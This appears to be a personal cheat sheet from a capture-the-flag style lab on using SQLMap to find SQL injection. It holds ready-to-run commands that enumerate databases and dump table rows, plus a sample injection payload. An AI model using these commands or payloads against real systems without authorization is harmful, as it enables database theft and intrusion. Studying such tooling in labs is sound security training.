# 31. SAL1 — Offensive Security Tooling: SQLMap (Cheat Sheet)
tags: [sqlmap, sqli, automation, dbs, tables, dump, post-request, wizard]

> ⚠️ Use on targets you have permission to test (labs/CTFs only).

## TL;DR
- **Goal:** Detect & exploit SQL injection automatically; enumerate DBs → tables → rows. :contentReference[oaicite:0]{index=0}  
- **Core flow:** `--dbs` → `-D <db> --tables` → `-D <db> -T <table> --dump`. :contentReference[oaicite:1]{index=1}  
- **Kickstart:** `sqlmap --wizard` (guided mode for beginners). :contentReference[oaicite:2]{index=2}  
- **GET example:** `sqlmap -u 'http://sqlmaptesting.thm/search/cat=1'` (parameter `cat`). :contentReference[oaicite:3]{index=3}  
- **Deep scan tip:** If simple scan fails, add `--level=5` and follow interactive prompts. :contentReference[oaicite:4]{index=4}

## Quick Start (Wizard)
```bash
sqlmap --wizard
# Guided prompts; paste full target URL when asked
````

*Why?* Wizard lists flags and walks you through a first scan.

## Detecting Injection (GET requests)

```bash
# Basic detection against a GET parameter
sqlmap -u 'http://sqlmaptesting.thm/search/cat=1'

# Example engine output will identify vector types (boolean, error, time, UNION)
# … then confirm backend (e.g., MySQL)
```

*Notes:* SQLMap reports boolean/time/UNION techniques and backend DBMS.  

---

## Enumerating Databases → Tables → Rows

```bash
# 1) List databases
sqlmap -u 'http://sqlmaptesting.thm/search/cat=1' --dbs

# 2) List tables in a chosen DB
sqlmap -u 'http://sqlmaptesting.thm/search/cat=1' -D users --tables

# 3) Dump a table's rows
sqlmap -u 'http://sqlmaptesting.thm/search/cat=1' -D users -T thomas --dump
```

*Why these flags?* `--dbs` lists DBs; then `-D <db> --tables`; then `-D <db> -T <table> --dump`.   

---

## Testing POST/Non-URL Parameters

```bash
# Intercept the request in a proxy (e.g., Burp), save to file:
#   intercepted_request.txt
sqlmap -r intercepted_request.txt
```

*Why?* For forms that send data in the request body.

## Practical Exercise Pattern (from the room)

```bash
# Example vulnerable endpoint (login) discovered via browser DevTools → Network:
'http://10.48.173.96/ai/includes/user_login?email=test&password=test'

# Run with deep scan and follow prompts as instructed:
sqlmap -u 'http://10.48.173.96/ai/includes/user_login?email=test&password=test' --dbs --level=5
```

*Tips from the task:* Quote the URL; add `--level=5`; answer Y/Y/Y then stop after the vulnerable param.

## SQLi Refresher (What SQLMap Automates)

* SQL injection abuses unsanitized input to alter SQL queries (e.g., `' OR 1=1--`).  
* Boolean/time/UNION/error-based techniques are typical exploitation paths. 

---

## Gotchas (and Fast Fixes)

| Symptom                          | Likely Cause                          | Fix                                                                                 |
| -------------------------------- | ------------------------------------- | ----------------------------------------------------------------------------------- |
| No findings on first pass        | Parameters hidden or scan too shallow | Use DevTools/Proxy to capture full request; run `-r` with `--level=5`.              |
| Tool asks many questions         | Backend heuristics & safety checks    | Answer Y to skip other DBMS tests, include MySQL tests, try random `--union-char`.  |
| URL with `?` breaks shell        | Special chars in terminal             | Wrap URL in single quotes `'...'`.                                                  |
| Enumeration stops at DB names    | Missed next flags                     | Continue with `-D <db> --tables` then `-D <db> -T <table> --dump`.                  |
| Unsure which param is injectable | Multi-param page                      | Let SQLMap test each; it will report vulnerable parameters and technique(s).        |
